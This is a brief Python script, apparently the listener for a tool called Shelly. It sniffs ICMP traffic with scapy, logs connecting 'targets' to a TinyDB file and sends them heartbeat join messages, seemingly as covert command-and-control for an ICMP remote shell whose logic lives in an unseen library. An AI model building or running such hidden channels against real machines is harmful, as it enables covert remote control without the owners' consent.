#!/usr/bin/python3

from scapy.all import sniff
import base64
from shellylib import Host
from tinydb import TinyDB, Query
import os
import time

TTL = int(64)
ICMP_ID = int(12800)

class Daemon(Host):
    
    def __init__(self):
        super().__init__()
        if os.path.exists('./db.json'):
            os.remove('./db.json')
        self.db = TinyDB('./db.json')

    def join(self, shellpack):
        target = {
            "id": round(time.time()),
            "ip": shellpack['ip'],
            "status": "CONNECTED"
            }

        print(f"[JOIN] Join received from {shellpack['ip']}")

        self.db.insert(target)

    def heartbeat(self):
        for target in self.db.all():
            Target = Query()
            self.db.update({'status': 'DISCONNECTED'}, Target.id == target['id'])
            self.send(target['ip'], "join")
        
if __name__ == "__main__":

    print("[ Starting Shelly daemon ]")
    shellyd = Daemon()
    print(shellyd)

    print("[ Starting sniffer ]")
    print("[ Shellpack log ]")
    sniff(iface=shellyd.iface, filter="icmp", prn=shellyd.sniff_callback, store="0")
